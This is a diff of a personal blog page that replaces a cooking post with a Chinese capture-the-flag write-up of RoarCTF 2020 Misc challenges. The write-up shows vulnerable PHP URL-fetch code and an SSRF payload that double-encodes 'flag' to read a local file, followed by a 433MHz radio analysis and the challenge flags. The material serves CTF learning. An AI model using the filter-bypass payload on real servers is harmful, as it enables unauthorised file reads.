@@ -1,9 +1,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=0">
-    <meta name="description" content="还没吃完，为了让tag页面正常先发一个
-" />
-    <meta name="keywords" content="厨艺" />
+    <meta name="description" content="wp全部转自https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485804&amp;idx=1&amp;sn=15b8b99fc9cdca98d5fa99484b77..." />
+    <meta name="keywords" content="" />
     <link rel="stylesheet" href="http://ayanagi.fun/media/css/bootstrap.min.css">
     <link rel="stylesheet" href="http://ayanagi.fun/styles/main.css">
     
@@ -473,25 +472,21 @@
         <div class="postshow" style="padding-bottom: 0;">
             
             <div class="postdetailimg" style="width:100%;overflow: hidden;">
-                <img src="https://pic.downk.cc/item/5fbb531bb18d627113de0748.png" class="postimage" style="cursor:auto">
+                <img src="https://pic.downk.cc/item/5fbb52f8b18d627113ddf786.png" class="postimage" style="cursor:auto">
             </div>
             <div class="postinfo-detail">
-                <div class="postdate"><i class="fa fa-calendar"></i>2020-11-23</div>
-                <div class="poststatus postdate"><i class="fa fa-clock-o"></i> 1 min read</div>
+                <div class="postdate"><i class="fa fa-calendar"></i>2020-12-08</div>
+                <div class="poststatus postdate"><i class="fa fa-clock-o"></i> 2 min read</div>
                 <div class="posttag">
-                    
-                    <a href="http://ayanagi.fun/tag/Cooking/" class="postlink">
-                        <i class="fa fa-tag"></i> 厨艺
-                    </a>
                     
                 </div>
             </div>
             
         <div id="articlecontent">
             <div id="texttitle" style="text-align: center">
-                <h2>梧州各粉店品鉴</h2>
+                <h2>RoarCTF 2020-Misc wp</h2>
                 <!-- id 将作为查询条件 -->
-                <div id="pl" style="display:none">http://ayanagi.fun/RwMvqFFRd/</div>
+                <div id="pl" style="display:none">http://ayanagi.fun/Roar2020/</div>
                 <div id="rootaddr" style="display:none">http://ayanagi.fun</div>
                 <span id="hotnum">
                     <h4><i class="fa fa-eye" aria-hidden="true" style="color: #FF8C00;"></i>&nbsp;&nbsp;热度</i>: <i
@@ -499,7 +494,40 @@
                 </span>
             </div>
             <div class="text ">
-                <p>还没吃完，为了让tag页面正常先发一个</p>
+                <p>wp全部转自<code>https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485804&amp;idx=1&amp;sn=15b8b99fc9cdca98d5fa99484b776063&amp;chksm=fd711c21ca0695374a191994b75b563b1a7604b70aa3c0b0251e78721f5a24de8ff85f85284f&amp;mpshare=1&amp;scene=23&amp;srcid=1207vysHlxNfj0iTwS4Fq5Xw&amp;sharer_sharetime=1607348906792&amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd</code><br>
+华丽丽的爆了零。<br>
+仰慕着夏风师傅对Roar2019的精彩wp，自己做BUU也遇到了相同的题，难度不高，然后小瞧了今年的。<br>
+只对misc有了解，web大概只有F12和GET/POST的水平，然后签到出不来，签到是个披着misc皮的web。</p>
+<h1 id="签到">签到</h1>
+<pre><code class="language-php">&lt;?php
+echo &quot;&lt;!-- /?url= --&gt;&quot;;
+if ($_GET['url']) {
+  if (preg_match(&quot;/flag/i&quot;, $_GET['url'])) {
+    die();
+  }
+  $curl = curl_init();
+
+  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+  curl_setopt($curl, CURLOPT_TIMEOUT, 500);
+  curl_setopt($curl, CURLOPT_URL, $_GET['url']);
+
+  $res = curl_exec($curl);
+  curl_close($curl);
+  echo $res;
+}
+//47.104.232.98:39390/?url=file:///%25%36%36%25%36%63%25%36%31%25%36%37
+//flag{c8ff10a5edb8acb9d8ef20f8eeba19a6} 
+</code></pre>
+<h1 id="hi-433mhz">Hi 433MHz</h1>
+<p>无线电流量分析，一看就不是我能做的题。但是看完wp乍一看也不是很难，只是第一次看见，不会分析罢了。<br>
+以下是北极星战队的wp：<br>
+汽车钥匙信号〜433Mhz。车钥匙信号的前导码是稳定的数据流，可以向接收者显示出实际正在被接受的数据。使用/inspectrum波形分析工具，symbols设为8个后，做相应调整，打开add sample plot选项<br>
+<img src="http://ayanagi.fun/post-images/1607395887242.png" alt="" loading="lazy"><br>
+我们要关注的是蓝色的波形，如果波形比较密集就代表1，比较稀疏就代表0<br>
+<img src="http://ayanagi.fun/post-images/1607395903655.png" alt="" loading="lazy"><br>
+然后就是慢慢的记录0、1二进制，转为ascii码就是flag</p>
+<pre><code>flag{25c21b0d-6a11-4312-971b-428d01cdc534}
+</code></pre>
 
             </div>
             <hr style="width: 80%;">
@@ -508,7 +536,7 @@
             <div class="postfooter">
                 <ul class="post-copyright">
                     <li><strong>文章作者：</strong>绮柳</li>
-            <li><strong>原文链接：</strong>http://ayanagi.fun/RwMvqFFRd/</li>
+            <li><strong>原文链接：</strong>http://ayanagi.fun/Roar2020/</li>
             <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA
                 许可协议。转载请注明出处！</li>
             </ul>
@@ -516,28 +544,28 @@
         <div id="otherpost">
             
             <div class="prev-post-pc">
-                <div id="ppcontainer" onclick="window.location.href= 'http://ayanagi.fun/motherboard/';return false">
+                <div id="ppcontainer" onclick="window.location.href= 'http://ayanagi.fun/SWPU2020/';return false">
                     
-                    <img src="https://pic.downk.cc/item/5fbb534fb18d627113de1a7e.png" style="width: 100%;" class="opimg">
+                    <img src="https://pic.downk.cc/item/5fbb52edb18d627113ddf42b.png" style="width: 100%;" class="opimg">
                     
-                    <h4 class="optitle">主板的探讨</h4>
+                    <h4 class="optitle">SWPUCTF 2020-Misc WP</h4>
                 </div>
             </div>
             <div class="prev-post">
-                上一篇 <a href="http://ayanagi.fun/motherboard/">主板的探讨</a>
+                上一篇 <a href="http://ayanagi.fun/SWPU2020/">SWPUCTF 2020-Misc WP</a>
             </div>
             
             
             <div class="next-post-pc">
-                <div id="npcontainer" onclick="window.location.href= 'http://ayanagi.fun/YYGQ/';return false">
+                <div id="npcontainer" onclick="window.location.href= 'http://ayanagi.fun/C1CTF2020/';return false">
                     
-                    <img src="https://pic.downk.cc/item/5fbb5268b18d627113ddccae.png" style="width: 100%;" class="opimg">
+                    <img src="https://pic.downk.cc/item/5fbb5343b18d627113de161c.png" style="width: 100%;" class="opimg">
                     
-                    <h4 class="optitle">指点江山</h4>
+                    <h4 class="optitle">C1CTF 2020-Misc WP</h4>
                 </div>
             </div>
             <div class="next-post">
-                下一篇 <a href="http://ayanagi.fun/YYGQ/">指点江山</a>
+                下一篇 <a href="http://ayanagi.fun/C1CTF2020/">C1CTF 2020-Misc WP</a>
             </div>
             
         </div>
@@ -682,7 +710,11 @@
 </script>
         
         <div class="toc-container">
-            
+            <ul class="markdownIt-TOC">
+<li><a href="#%E7%AD%BE%E5%88%B0">签到</a></li>
+<li><a href="#hi-433mhz">Hi 433MHz</a></li>
+</ul>
+
     </div>
     </div>
     </div>
@@ -920,7 +952,7 @@
                 var nc = new NewCounter();
                 nc.save({
                     time: 1,
-                    title: "梧州各粉店品鉴",
+                    title: "RoarCTF 2020-Misc wp",
                     url: pl,
                     xid: pl,
                 }).then(function (object) {
